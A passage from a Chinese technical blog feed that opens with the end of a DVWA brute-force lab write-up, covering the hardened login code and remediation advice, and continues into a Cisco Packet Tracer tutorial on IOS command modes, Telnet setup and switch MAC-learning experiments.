<span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{</span>        <span class="token comment" spellcheck="true">// Login failed</span>        <span class="token function">sleep</span><span class="token punctuation">(</span> <span class="token function">rand</span><span class="token punctuation">(</span> <span class="token number">2</span><span class="token punctuation">,</span> <span class="token number">4</span> <span class="token punctuation">)</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Give the user some feedback</span>        <span class="token keyword">echo</span> <span class="token string">"&lt;pre>&lt;br />Username and/or password incorrect.&lt;br />&lt;br/>Alternative, the account has been locked because of too many failed logins.&lt;br />If this is the case, &lt;em>please try again in {$lockout_time} minutes&lt;/em>.&lt;/pre>"</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">// Update bad login count</span>        <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET failed_login = (failed_login + 1) WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment" spellcheck="true">// Set the last login time</span>    <span class="token variable">$data</span> <span class="token operator">=</span> <span class="token variable">$db</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">prepare</span><span class="token punctuation">(</span> <span class="token string">'UPDATE users SET last_login = now() WHERE user = (:user) LIMIT 1;'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">bindParam</span><span class="token punctuation">(</span> <span class="token string">':user'</span><span class="token punctuation">,</span> <span class="token variable">$user</span><span class="token punctuation">,</span> <span class="token constant">PDO</span><span class="token punctuation">:</span><span class="token punctuation">:</span><span class="token constant">PARAM_STR</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$data</span><span class="token operator">-</span><span class="token operator">></span><span class="token function">execute</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment" spellcheck="true">// Generate Anti-CSRF token</span><span class="token function">generateSessionToken</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter">?></span> </code></pre><p>说明：</p><ul><li>相比High级别的代码，Impossible级别的代码采用POST方式向服务器提交数据。</li><li>为了防止对用户登录的暴力破解，添加了登录错误后锁定账号的操作，可以有效地方式短时间内对用户名和密码的暴力破解。</li><li>在动态生成SQL语句时使用PDO方式并对SQL参数过滤有效地避免了SQL注入的产生。</li></ul><h1 id="0x04-修复建议"><a href="#0x04-修复建议" class="headerlink" title="0x04 修复建议"></a>0x04 修复建议</h1><ul><li>对于修改数据和登陆表单提交使用 POST 方式，同时数据通过 POST 方式读取</li><li>添加随机 token 预防 csrf 攻击</li><li>针对登陆功能可添加图形验证码，每提交一次数据，验证码改变一次，验证功能在服务<br>端进行</li><li>针对登陆次数进行限制，可使用登陆远程 IP 或用户名两种方式进行锁定，登录错误次<br>数 5 分钟之内超过 3 次锁定 1-3 小时</li><li>对于管理类系统配置登陆用户允许的 IP 范围</li><li>可使用短信验证和邮箱验证方式实现双因子认证，注意对短信轰炸和邮件轰炸的防御</li><li>密码等敏感字段进行加密后传输，例如密码使用加盐 hash 算法等加密后传输  </li></ul><h1 id="0x05-参考资料"><a href="#0x05-参考资料" class="headerlink" title="0x05 参考资料"></a>0x05 参考资料</h1><ul><li>《DVWA 漏洞测试平台分析》，红日安全工具研发组长-Silence</li></ul>]]></content>
      
      
      <categories>
          
          <category> Web安全 </category>
          
          <category> 靶机 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DVWA </tag>
            
            <tag> BruteForce </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Ciscp Packet Tracer实验及实训</title>
      <link href="/2020/09/09/cisco-packet-tracer-shi-yan-ji-shi-xun/"/>
      <url>/2020/09/09/cisco-packet-tracer-shi-yan-ji-shi-xun/</url>
      
        <content type="html"><![CDATA[<h1 id="第1章-实验基础"><a href="#第1章-实验基础" class="headerlink" title="第1章 实验基础"></a>第1章 实验基础</h1><p>​        Ciscp Packet Tracer是一个非常理想的虚拟网络软件实验平台，可以完成各种规模校园网和企业网的设计、配置和调试过程，可以基于具体网络环境，分析各种网络协议运行过程中网络设备之间交换的报文类型、报文格式及报文处理流程，可以直接了解IP分组端到端传输过程中交换机、路由器等网络设备对IP分组的作用过程。除了不能实际物理接触外，Cisco Packet Tracer提供了和实际实验环境几乎一样的仿真环境。</p><h2 id="用户界面"><a href="#用户界面" class="headerlink" title="用户界面"></a>用户界面</h2><p>​        用户界面及功能说明如图1-1所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/用户界面.png" alt="用户界面"></center><center>图1-1 用户界面</center><p><strong>菜单栏</strong>：显示或配置软件参数、     保存或打开工程文件等</p><ul><li>File（文件）菜单给出工作区新建、打开和存储文件命令</li><li>Edit（编辑）菜单给出复制、粘贴和撤销输入命令</li><li>Options（选项）菜单给出PT的一些配置选项</li><li>View（视图）菜单给出放大、缩小工作区中某个设备的命令</li><li>Tools（工具）菜单给出几个分组处理命令</li><li>Extensions（扩展）菜单给出有关PT扩展功能的子菜单</li><li>Help（帮助）参数给出PT详细的使用说明</li></ul><p><strong>主工具栏</strong>：给出PT常用命令，这些命令通常包含在各个菜单中</p><p><strong>公共工具栏</strong>：给出对工作区中构件进行操作的工具</p><ul><li><strong>选择工具</strong>用于在工作区中移动某个指定区域。通过拖动鼠标指定工作区的某个区域，然后再工作区中移动该区域。当需要<strong>从其他工具中退出时</strong>，单击选择工具</li><li><strong>注释工具</strong>：用于在工作区中任意位置添加注释</li><li><strong>删除工具</strong>：用于在工作区中删除某个网络设备</li><li><strong>查看工具</strong>：用于检查网络设备生成的控制信息，如路由器路由表、交换机转发表等</li><li><strong>绘图工具</strong>：用于在工作区中绘制各种图形，如直线、正方形、长方形和椭圆等</li><li><strong>调整图形大小工具</strong>：用于任意调整通过绘图工具绘制的图形的大小</li><li><strong>简单报文工具</strong>：用于在选中的发送终端与接受终端之间启动一次ping操作</li><li><strong>复杂报文工具</strong>：用于在选中的发送终端与接受终端之间启动一次报文传输过程，报文类型和格式可以由用户设定</li></ul><p><strong>工作区</strong>：软件进行网络模拟时主要使用的区域</p><ul><li>逻辑工作区：用于设计网络拓扑结构、配置网络设备、检测端到端连通性等。</li><li>物理工作区：给出城市布局、城市内建筑物布局和建筑物内配线间布局等。</li></ul><p><strong>物理和逻辑工作区栏</strong>：可以通过工作区选择按钮选择物理工作区和逻辑工作区</p><ul><li>物理工作区栏工具：<ul><li>NC（创建城市）</li><li>NB（创建建筑物）</li><li>NG（创建通用柜子）</li><li>NW（创建配线间）</li><li>Move（移动对象）</li><li>Grid（配置栅格）</li><li>Set Background（设置背景）</li></ul></li><li>逻辑工作区栏工具：<ul><li>New Cluster（创建新集群）</li><li>Move Object（移动对象）</li><li>Set Tiled Background（设置工作区背景）</li><li>Viewport（视窗）</li></ul></li></ul><p><strong>模式选择栏</strong>：（实时操作模式和模拟操作模式）</p><ul><li><strong>实时操作模式</strong>可以验证网络任何两个终端之间的连通性</li><li><strong>模拟操作模式</strong>可以给出分组端到端传输过程中得分每一个步骤，及每一个步骤涉及的报文类型、报文格式和报文处理流程</li></ul><p><strong>设备类型选择框</strong>：用于选择网络设备的类型</p><ul><li>Routers（路由器）</li><li>Switches（交换机）</li><li>Hubs（集线器）</li><li>Wireless Devices（无线设备）</li><li>Connections（连接线）</li><li>End Devices（终端设备）</li><li>Security（安全设备）</li><li>Wan Emulation（广域网仿真设备）</li><li>Custom Made Devices（定制设备）</li></ul><p><strong>设备选择框</strong>：用于选择指定类型的网络设备型号，可以通过设备选择框选择Cisco各种型号的路由器</p><ul><li><strong>设备类型</strong>：路由器、交换机、集线器、无线设备、连接线、终端设备、安全设备、广域网仿真设备等</li><li><strong>配置方式</strong>：<ul><li>物理配置：添加、去掉、修改网络设备插槽中的模块</li><li>图形接口配置：可以对网络设备进行一些基本的配置</li><li>命令行接口配置：功能最全的配置方式，也是最接近实际情况的配置方式</li></ul></li></ul><p><strong>其他命令按钮</strong>：</p><ul><li><strong>Power Cycle Devices</strong>：使所有设备重新加电</li><li><strong>Fast Forward Time</strong>：加快设备的推进速度</li></ul><h2 id="操作模式"><a href="#操作模式" class="headerlink" title="操作模式"></a>操作模式</h2><p><strong>实时操作模式</strong><br>        实时操作模式为仿真网络实际运行过程，用户可以检查网络设备，转发表、路由表等控制信息，通过发送分组检测端到端连通性。实时操作模式下，完成网络配置过程后，网络设备自动完成相关协议执行过程。<br><strong>模拟操作模式</strong><br>        模拟操作模式是仿真网络软件提供的学习工具，用户可以了解网络中报文或分组的传输过程，同时可以查看以PDU形式传输的报文内容和格式。模拟操作模式下，完成网络配置过程后，可能需要用户完成多个推进步骤后，才能看到协议执行结果。<br>        （通常情况下，实验操作以实时操作模式为主，在理解报文传输过程、解析报文格式、排除链路故障时才会使用模拟操作模式）</p><h2 id="IOS命令模式"><a href="#IOS命令模式" class="headerlink" title="IOS命令模式"></a>IOS命令模式</h2><p><strong>用户模式</strong><code>（User Mode）</code><br>        用户模式是权限最低的命令行模式，用户只能通过命令查看网络设备的一些状态，没有配置网络设备的权限，也不能修改网络设备状态和控制信息。用户登录网络设备之后，立即进入用户模式。<br><strong>特权模式</strong><code>（Privileged Mode）</code><br>        特权模式下不仅可以执行部分查询命令，还可以对网络设备中的文件进行操作。<font color="blue">（从用户模式进入特权模式需要使用enable命令）</font><br><strong>全局模式</strong><code>（Global Mode）</code></p><p>​        全局模式下，用户可以完成对整个网络设备有效的配置。<font color="blue">（从特权模式进入全局模式需要输入configure terminal）</font></p><p><strong>帮助工具</strong></p><ul><li>查找工具：可使用“？”查询可键入命令</li><li>命令简写：允许键入命令不完整，但必须保证已键入命令在命令库中有唯一匹配</li></ul><p><strong>取消命令</strong></p><p>​        使用”no”关键字可取消已经完成的配置</p><p>​        eg:（取消设置的端口）</p><p>​            <code>Router（config）# int f0/0</code></p><p>​            <code>Router（config-if）# no ip add 192.168.1.1 255.255.255.0</code></p><h2 id="网络设备连接选择"><a href="#网络设备连接选择" class="headerlink" title="网络设备连接选择"></a>网络设备连接选择</h2><ul><li>不同类型的设备，用于发送、接受信号的两对引脚的编号有可能是不同的，对于用不同编号的两对引脚发送、接受信号的两端设备，需要通过<strong>直通线（<code>Copper Straight-Trough</code>）</strong>连接；</li><li>同一类型的设备，用于发送、接受信号的两对引脚的编号是相同的，需要通过<strong>交叉线（<code>Copper Cross-Over</code>）</strong>连接；</li><li>路由器与路由器之间可以使用交叉线（同级设备）也可以使用Serial模块和<strong>串行（<code>Serial）</code>线</strong>连接；<ul><li>串口通常是路由器在连接ISP路由器时使用，在模拟环境中使用serial时必须要配置时钟频率</li><li>使用交叉线和串口线的区别在于：交叉线两端的设备之间可以进行协商、使用serial接口的设备不接受协商</li></ul></li><li>Console线用在PC端对交换机或路由器的直接配置时。</li></ul><h2 id="网络设备配置方式"><a href="#网络设备配置方式" class="headerlink" title="网络设备配置方式"></a>网络设备配置方式</h2><h3 id="控制台端口配置方式"><a href="#控制台端口配置方式" class="headerlink" title="控制台端口配置方式"></a>控制台端口配置方式</h3><p>​        交换机和路由器出厂时，只有默认配置，如果需要对交换机和路由器进行配置，最直接的配置方式是采用控制台端口配置方式，用串行口连接线互连<strong>PC的RS-232串行口</strong>和<strong>网络设备的Console端口</strong>，启动PC的<strong>超级终端程序</strong>，完成超级终端程序参数配置，按Enter键进入网络设备的命令行接口配置界面。</p><p><strong>实现过程</strong>：</p><ol><li><p>互连网络设备和终端设备，如图1-2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/互连网络设备和终端设备.png" alt="互连网络设备和终端设备"></center><center>图1-2 互连网络设备和终端设备</center></li><li><p>配置超级终端连接参数，如图1-3所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/配置超级终端连接参数.png" alt="配置超级终端连接参数"></center><center>图1-3 配置超级终端连接参数</center></li><li><p>进入命令行接口配置界面，如图1-4所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/进入命令行接口配置界面.png" alt="进入命令行接口配置界面"></center></li></ol><center>图1-4 接口配置界面</center><h3 id="Telnet配置方式"><a href="#Telnet配置方式" class="headerlink" title="Telnet配置方式"></a>Telnet配置方式</h3><p>​        Telnet配置是一种不受地理位置限制的配置方式，经常使用该方式进行网络的后期维护工作，但使用Telnet配置方式的前提条件是网络中的设备已经完成基本的配置（IP地址、子网掩码、网关、路由协议）。</p><p><strong>实现过程</strong>：</p><ol><li><p><strong>网络设备互连基本配置<font color="blue">（IP地址、子网掩码、默认网关、RIP协议）</font>，如图1-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/网络设备互连基本配置.png" alt="网络设备互连基本配置"></center><center>图1-5 网络设备互连基本配置</center></li><li><p><strong>Telnet配置，如图1-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Telnet配置.png" alt="Telnet配置"></center><center>图1-6 Telnet配置</center></li><li><p><strong>终端PC通过Telnet远程登录路由器，如图1-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端PC通过Telnet远程登录路由器.png" alt="终端PC通过Telnet远程登录路由器"></center><center>图1-7 终端PC通过Telnet远程登录路由器</center></li></ol><h1 id="第2章-交换式以太网实验"><a href="#第2章-交换式以太网实验" class="headerlink" title="第2章 交换式以太网实验"></a>第2章 交换式以太网实验</h1><h2 id="影响交换机实验的因素"><a href="#影响交换机实验的因素" class="headerlink" title="影响交换机实验的因素"></a>影响交换机实验的因素</h2><ol><li><p><strong>CDP干扰</strong>[^1]</p><p>Cisco交换机默认状态下，启动<strong>Cisco发现协议<code>（Cisco Discovery Protocol，CDP）</code></strong>，CDP能够检测到与交换机直接连接的设备，因此，即使终端不发送MAC帧，交换机也能检测到各个端口连接的终端，并<strong>在转发表中创建相应的转发项</strong>。为防止CDP干扰交换机实验，应该在交换机中停止运行CDP。</p><p>eg:</p><p><code>Switch（config）# no cdp run</code></p></li><li><p><strong>地址解析过程</strong>[^1]</p><p>PT无法通过给出源和目的终端的MAC地址直接构建MAC帧，并启动MAC帧源终端至目的终端的传输过程，需要通过给出源和目的终端的IP地址构建IP分组，然后启动IP分组源终端至目的终端的传输过程。通过ARP协议解析报文，并在交换机的转发表中创建源和目的终端MAC地址对应的转发项。一旦终端完成某个IP地址的地址解析过程，该IP地址与对应的MAC地址之间的绑定项将在ARP缓冲区中保持一段时间，在该段时间内，终端无须再对该IP地址进行地址解析过程。</p></li></ol><h2 id="集线器和交换机工作原理验证实验"><a href="#集线器和交换机工作原理验证实验" class="headerlink" title="集线器和交换机工作原理验证实验"></a>集线器和交换机工作原理验证实验</h2><h3 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        网络结构如图2-1所示，查看交换机连接集线器端口和连接终端端口的通信方式。在假定加环己初始MAC表为空的前提下，依次进行①~⑤MAC帧传输过程，并观察每一次MAC帧传输过程中，该MAC帧所达到的终端。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-网络结构.png" alt="集线器和交换机工作原理验证实验-网络结构"></center><center>图2-1 网络结构</center><p>① 终端A $\rightarrow$ 终端B</p><p>② 终端B $\rightarrow$ 终端A</p><p>③ 终端D $\rightarrow$ 终端E</p><p>④ 终端E $\rightarrow$ 终端D</p><p>⑤ 终端G $\rightarrow$ 终端A</p><h3 id="实验目的"><a href="#实验目的" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证交换机端口通信方式与所连接的网段之间的关系</li><li>验证集线器广播MAC帧过程</li><li>验证交换机地址学习过程</li><li>验证交换机转发、广播和丢弃收到的MAC帧的条件</li><li>验证交换机端口采用不同通信方式的条件</li><li>验证以太网端到端数据传输过程</li></ol><h3 id="实验原理"><a href="#实验原理" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        当交换机端口连接一个冲突域时（eg:交换机与Hub相连），该交换机端口采用<strong>半双工通信</strong>方式。当交换机端口只连接一个终端时，该交换机端口采用<strong>全双工通信</strong>方式，交换机端口与终端之间不再构成冲突域。</p><p><strong>① 终端A $\rightarrow$ 终端B</strong>，<strong>如图2-2所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-终端A到终端B.png" alt="集线器和交换机工作原理验证实验-终端A到终端B"></center><center>图2-2 终端A到终端B</center><p><strong>② 终端B $\rightarrow$ 终端A</strong>，<strong>如图2-3所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-终端B到终端A.png" alt="集线器和交换机工作原理验证实验-终端B到终端A"></center><center>图2-3 终端B到终端A</center><p><strong>③ 终端D $\rightarrow$ 终端E</strong>，<strong>如图2-4所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-终端D到终端E.png" alt="集线器和交换机工作原理验证实验-终端D到终端E"></center><center>图2-4 终端D到终端E</center><p><strong>④ 终端E $\rightarrow$ 终端D</strong>，<strong>如图2-5所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-终端E到终端D.png" alt="集线器和交换机工作原理验证实验-终端E到终端D"></center><center>图2-5 终端E到终端D</center><p><strong>⑤ 终端G $\rightarrow$ 终端A</strong>，<strong>如图2-6所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-终端G到终端A.png" alt="集线器和交换机工作原理验证实验-终端G到终端A"></center><center>图 2-6 终端G到终端A</center><h3 id="实验步骤"><a href="#实验步骤" class="headerlink" title="实验步骤"></a>实验步骤</h3><ol><li><p><strong>按实验要求构建网络拓扑</strong>，<strong>如图2-7所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/集线器和交换机工作原理验证实验-网络结构.png" alt="集线器和交换机工作原理验证实验-网络结构"></center><center> 图2-7 构建网络拓扑</center></li><li><p><strong>网络设备基本配置</strong>（<strong>IP地址、子网掩码），如图2-8所示。</strong></p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端A-IP配置.png" alt="终端A-IP配置"></center><center>图2-8 终端A-IP配置</center><p>（<font color="blue">上图为终端A的IP配置，其他终端IP配置与其类似</font>）</p></li><li><p><strong>查看ARP缓冲区</strong></p><p>使用工具栏中的<strong>查看工具</strong>单击指定网络设备后选择菜单中的<strong>ARP Table选项</strong>，即可展示此设备的ARP缓冲区中的数据，如图2-9所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/ARP Table for 终端A.png" alt="ARP Table for 终端A"></center><center>图2-9 ARP Table for 终端A</center><p>使用同样的操作方式可查看交换机或路由器的<strong>MAC Table</strong>，如图2-10所示。</p></li></ol><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/MAC Table for Switch0.png" alt="MAC Table for Switch0"></center><center>图2-10 MAC Table for Switch0</center><ol start="4"><li><p><strong>停止运行CDP并清空MAC表</strong> </p><p>为了消除实验过程中可能存在的干扰，通常使用<strong>no cdp run</strong>命令使交换机<strong>停止运行CDP</strong>，并且还需要使用<strong>clear mac-address-table</strong>命令<strong>清空交换机转发表</strong>，操作命令如图2-11所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/停止CDP和清空MAC表.png" alt="停止CDP和清空MAC表"></center><center> 图2-11 停止CDP和清空MAC表</center></li><li><p><strong>设置通信方式</strong></p><p>交换机与Hub相连的端口设置成半双工（如图2-12所示），交换机与终端相连的端口设置成全双工，设置操作（如图2-13所示）</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch与Hub相连端口设置.png" alt="Switch与Hub相连端口设置"></center><center>图2-12 Switch与Hub相连端口设置</center><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch与终端相连端口设置.png" alt="Switch与终端相连端口设置"></center></li></ol><center>图2-13 Switch与终端相连端口设置</center><ol start="6"><li><p><strong>设置过滤报文类型</strong></p><p>进入模拟操作模式，单击Edit Filter按钮，在弹出的报文类型过滤框中选择ICMP报文类型，如图2-14所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/设置过滤报文类型.png" alt="设置过滤报文类型"></center><center>图2-14 设置过滤报文类型</center></li><li><p><strong>终端Aping终端B</strong></p><ul><li><p>终端A将ICMP报文传送到Hub0，如图2-15所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B1.png" alt="终端Aping终端B1"></center><center>图2-15 终端Aping终端B1</center></li><li><p>Hub0广播该ICMP报文，如图2-16所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B2.png" alt="终端Aping终端B2"></center><center>图2-16 终端Aping终端B2</center></li><li><p>Switch收到报文后，先创建至MACA的转发表项，再广播该ICMP报文，如图2-17所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B3.png" alt="终端Aping终端B3"></center><center>图2-17 终端Aping终端B3</center></li><li><p>Hub1接收到Switch广播的ICMP报文后，继续广播，如图2-18所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B4.png" alt="终端Aping终端B4"></center><center>图2-18 终端Aping终端B4</center></li><li><p>终端B收到Hub0广播的ICMP报文后，发送回应ICMP报文至Hub0，如图2-19所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B5.png" alt="终端Aping终端B5"></center><center>图2-19 终端Aping终端B5</center></li><li><p>Hub0接收接收到终端B发给终端A的报文后，继续广播发送。当Switch接收到Hub0广播的ICMP，先在转发表中创建至MACB对应的转发项，再丢弃该报文；当终端A接收到Hub0广播的ICMP包，一次ping测试完成，操作过程如图2-20所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Aping终端B6.png" alt="终端Aping终端B6"></center><center>图2-20 终端Aping终端B6</center></li><li><p>一次测试完毕之后Switch的转发表如图2-21所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch转发表1.png" alt="Switch转发表1"></center><center> 图2-21 Switch转发表1</center></li></ul></li><li><p><strong>终端Bping终端A</strong></p><ul><li><p>终端B将ICMP报文发送至Hub0，Hub0广播该报文，Switch和终端C接收到报文后进行丢弃，终端A接收到报文后发送回应报文，操作如图2-22所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Bping终端A.png" alt="终端Bping终端A"></center><center>图2-22 终端Bping终端A</center></li><li><p>测试完成之后Switch的转发表如图2-23所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch转发表1.png" alt="Switch转发表1"></center><center>图2-23 Switch转发表1</center></li></ul></li><li><p><strong>终端Dping终端E</strong></p><ul><li><p>终端D向Switch发送ICMP报文，Switch接收报文后，先创建一条至MACD的表项，再广播该报文；Hub接收到报文后继续广播，直至终端将报文丢弃；终端E接收到报文后，发送回应ICMP报文，Switch接收到报文后，先创建一条至MACE的变项，再将报文冲F0/1端口转发出去给终端D，操作过程如图2-24所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Dping终端E.png" alt="终端Dping终端E"></center><center>图2-24 终端Dping终端E</center></li><li><p>测试完成之后Switch的转发表如图2-25所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch转发表2.png" alt="Switch转发表2"></center><center>图2-25 Switch转发表2</center></li></ul></li><li><p><strong>终端Eping终端D</strong></p><ul><li><p>终端E向Switch发送ICMP报文，Switch将报文从f0/1端口转发给终端D，操作如图2-26所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/终端Eping终端D.png" alt="终端Eping终端D"></center><center> 图2-26 终端Eping终端D</center></li><li><p>测试完成之后Switch的转发表如图2-27所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch转发表2.png" alt="Switch转发表2"></center><center> 图2-27 Switch转发表2</center></li></ul></li><li><p><strong>终端Gping终端A</strong></p><ul><li><p>终端G向Hub1发送ICMP报文，Hub1广播该报文；Switch接收到报文后，先创建一条至MACG的表项，再将该报文从f0/23端口转发给Hub0；Hub0接收到报文后广播给域内所有终端；终端A接收到报文后发送应答报文，其余终端作丢弃操作；报文按源路线回到终端G。</p></li><li><p>测试完成之后Switch的转发表如图2-28所示</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/Switch转发表3.png" alt="Switch转发表3"></center><center>图2-28 Switch转发表3</center></li></ul></li></ol><h2 id="交换式以太网实验"><a href="#交换式以太网实验" class="headerlink" title="交换式以太网实验"></a>交换式以太网实验</h2><h3 id="实验内容-1"><a href="#实验内容-1" class="headerlink" title="实验内容"></a>实验内容</h3><p>​        构建如图3-1所示的交换式以太网结构，在三个交换机的初始转发表为空的情况下，分别完成终端A与终端B、终端C和终端D之间的MAC帧传输过程，查看三个交换机的MAC表。清空交换机S1的MAC表，查看终端A与终端B之间的MAC帧传输过程。将终端A转接到交换机S3，查看终端B至终端A，终端C至终端A的MAC帧传输过程。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-网络拓扑图.png" alt="交换式以太网实验-网络拓扑图"></center><center>图3-1 网络拓扑图</center><h3 id="实验目的-1"><a href="#实验目的-1" class="headerlink" title="实验目的"></a>实验目的</h3><ol><li>验证交换式以太网的连通性，证明连接在交换式以太网上的任何两个分配了相同网络号、不同主机号的IP地址的终端之间能够实现IP分组传输过程。</li><li>验证转发表建立过程。</li><li>验证交换机MAC帧转发过程，重点验证交换机过滤MAC帧的功能，即如果交换机接收MAC帧的端口与该MAC帧匹配的转发项中的转发端口相同，交换机丢弃该MAC帧。</li><li>验证转发项与交换式以太网拓扑结构一致性的重要性。</li></ol><h3 id="实验原理-1"><a href="#实验原理-1" class="headerlink" title="实验原理"></a>实验原理</h3><p>​        当三个交换机初始状态为空的情况下，终端A到终端B的MAC帧传输过程中，经过三个交换机的广播。所以三个交换机都存在MAC地址为MACA的转发项，而S1中还存在MAC地址为MACB的转发项，具体执行过程如图3-2所示。</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Network/Configuration/Cisco-PT-shixun/交换式以太网实验-终端A至终端B.png" alt="交换式以太网实验-终端A至终端B"></center><center>图3-2 终端A至终端B</center><p>​        据此类推，再经过终端A到终端C、终端D的传递过程后，S1中存在到MACA、MACB、MACC、MACD的转发项；S2中存在到MACA、MACC、MACD的转发项；S3中存在到MACA、MACC、MACD的转发项。</p><p>​        当清除交换机S1中的转发表后，终端B至终端A的MAC帧传输过程中，S1缺失到MACA的转发表项，因此S1广播接收到的MAC帧，此过程使S2和S3中也获得至MACB的转发表项，具体操作过程如图3-3所示。</p><center><img 